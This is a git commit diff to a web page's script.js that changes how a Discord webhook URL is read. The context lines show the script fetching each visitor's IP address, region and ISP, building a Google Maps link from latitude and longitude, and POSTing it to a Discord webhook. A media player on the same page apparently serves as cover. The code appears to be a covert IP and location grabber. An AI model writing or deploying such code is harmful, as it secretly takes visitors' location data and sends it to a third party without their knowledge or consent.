d5213b28010221ff6c2601aa8037b534b80a8f97
Rudraksha <141563051+rudraksha132@users.noreply.github.com>
2025-01-25 23:26:24 +0530

    Update script.js

--- script.js
+++ script.js
@@ -6,7 +6,6 @@ const regionElement = document.getElementById('region');
 const ispElement = document.getElementById('isp');
 const player = document.getElementById('player'); 
 const playPauseButton = document.getElementById('play-pause-button');
-const webhookUrl = process.env.WEBHOOK_URL;
 
 // Fetch the IP address and location data
 fetch('https://api.ipify.org?format=json')
@@ -35,7 +34,7 @@ fetch('https://api.ipify.org?format=json')
                        `[Map](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})\n`;
 
         // Send to Discord Webhook
-        fetch(webhookUrl, {
+        fetch(process.env.WEBHOOK_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
